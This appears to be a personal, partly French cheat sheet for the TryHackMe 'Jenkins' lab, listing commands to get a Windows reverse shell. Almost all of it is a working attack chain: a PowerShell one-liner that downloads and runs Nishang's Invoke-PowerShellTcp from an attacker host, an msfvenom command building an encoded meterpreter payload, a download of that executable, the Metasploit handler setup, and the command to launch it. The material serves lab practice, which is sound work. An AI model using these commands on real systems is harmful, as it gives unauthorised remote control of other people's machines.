# Windows\_shell

### Windows shell

### Machine Jenkins tryhackme

Utilisation de Nishang pour l'accés initial\
[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Cet outil :\
[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Commande à executer depuis le serveur jenkins:

powershell iex **(**New-Object  Net.WebClient**)**.DownloadString**(**'http://your-ip:your-port/Invoke-PowerShellTcp.ps1'**);**Invoke-PowerShellTcp  -Reverse -IPAddress your-ip -Port your-port

Use msfvenom to create the a windows meterpreter reverse shell using the following payload\
`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`

After creating this payload, download it to the machine using the same method in the previous step:\
`powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`

Before running this program, ensure the handler is set up in metasploit:\
`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run`

Dans la première console accedée:\
`Start-Process "shell-name.exe"`
